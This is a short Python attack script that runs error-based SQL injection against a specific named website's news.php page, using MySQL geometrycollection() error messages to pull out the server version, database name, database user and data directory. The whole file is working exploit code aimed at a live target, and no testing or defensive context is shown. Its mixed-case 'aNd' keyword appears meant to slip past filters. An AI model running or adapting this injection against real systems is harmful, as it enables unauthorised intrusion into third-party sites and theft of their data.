#!/usr/bin/env python3
"""zagroup: geometrycollection error-based extraction!
'Illegal non geometric 'VALUE' value found during parsing' - VALUE = our data
"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(8000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def extract(expr, tag):
    # numeric context: c=259 aNd geometrycollection(EXPR)
    param = "259%20aNd%20geometrycollection(" + expr + ")"
    code, body = fetch(BASE + "?c=" + param)
    m = re.search(r"Illegal non geometric '([^']+)' value found", body)
    print("%-20s code=%s %s" % (tag, code, ("DATA: " + m.group(1)[:150]) if m else "NOERR/size=%d" % len(body)))
    return m.group(1) if m else ""
    time.sleep(2)

print("=== geometrycollection extraction ===")
extract("version()", "version")
extract("database()", "database")
extract("user()", "user")
extract("concat(0x7e,version())", "~version")
extract("concat(0x7e,database())", "~database")
extract("concat(0x7e,user())", "~user")
extract("concat(0x7e,@@datadir)", "~datadir")
